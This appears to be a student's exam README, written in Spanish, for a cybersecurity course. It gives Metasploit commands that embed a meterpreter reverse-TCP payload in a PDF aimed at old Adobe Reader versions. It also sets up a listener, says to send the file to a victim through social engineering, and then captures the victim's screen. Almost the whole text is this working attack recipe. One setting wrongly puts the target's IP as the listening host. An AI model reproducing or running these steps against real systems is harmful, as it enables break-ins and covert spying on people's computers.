# -UDEM--Ciberseguridad
Parcial de Ciberseguridad

Vídeo:

Explicación: Incrusta una Carga (payload) dentro un archivo PDF existente. El archivo PDF resultante puede ser enviado al objetivo como parte de un ataque de ingeniería social.

Sistema Operativo: Windows XP SP3 (Inglés/Español) / Windows Vista / Windows 7 (Inglés)
Programas: Adobe Reader v8.x, v9.x <br />
<br />
use exploit/windows/fileformat/adobe_pdf_embedded_exe <br />
set payload windows/meterpreter/reverse_tcp <br />
set lhost <ip_maquina_a_atacar> <br />
set lport 4444 <br />
set infilename /root/parcial/el_gigante_egoista.pdf <br />
exploit <br />
<br />
back <br />
use exploit/multi/handler <br />
set lhost <ip_maquina_a_atacar> <br />
set lport 4444 <br />
exploit <br /> 
<br />
Enviar archivo a la máquina que se desea atacar <br />
cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter<br />
<br />
load espia<br />
screengrab
